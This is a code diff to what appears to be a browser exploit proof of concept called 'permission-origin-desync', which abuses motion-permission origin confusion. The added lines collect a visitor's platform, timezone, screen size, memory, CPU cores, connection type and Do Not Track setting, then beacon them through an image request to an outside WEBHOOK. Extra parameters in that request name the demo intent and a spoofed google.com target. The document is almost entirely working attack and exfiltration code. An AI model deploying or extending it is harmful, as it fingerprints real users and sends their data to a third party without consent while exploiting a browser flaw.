@@ -43,6 +43,8 @@ function sendProofGET(status){
     if(n){ navType=n.type; navRedirects=n.redirectCount; }
   }catch(e){}
 
+  const conn = navigator.connection || {};
+
   const params = new URLSearchParams({
     poc: 'permission-origin-desync',
     permission: 'motion',
@@ -63,6 +65,21 @@ function sendProofGET(status){
     nav_type: navType,
     nav_redirects: navRedirects,
 
+    // ===== Environment / fingerprint (passive) =====
+    platform: navigator.platform,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen_res: screen.width + 'x' + screen.height,
+    color_depth: screen.colorDepth,
+    device_memory: navigator.deviceMemory || 'na',
+    cpu_cores: navigator.hardwareConcurrency || 'na',
+    touch_points: navigator.maxTouchPoints,
+    cookie_enabled: navigator.cookieEnabled,
+    dnt: navigator.doNotTrack || 'na',
+
+    connection_type: conn.effectiveType || 'na',
+    save_data: conn.saveData || false,
+
+    // timing
     perf_now_ms: Math.round(performance.now()),
     ts: Date.now(),
 
@@ -71,7 +88,13 @@ function sendProofGET(status){
   });
 
   const img = new Image();
-  img.src = WEBHOOK + '?' + params.toString();
+  img.src =
+    WEBHOOK +
+    '?' + params.toString() +
+    '&poc_version=final' +
+    '&demo_intent=origin_confusion' +
+    '&target_tail=https://google.com:9090' +
+    '&marker=END';
 }
 
 /* ================= PERMISSION ================= */
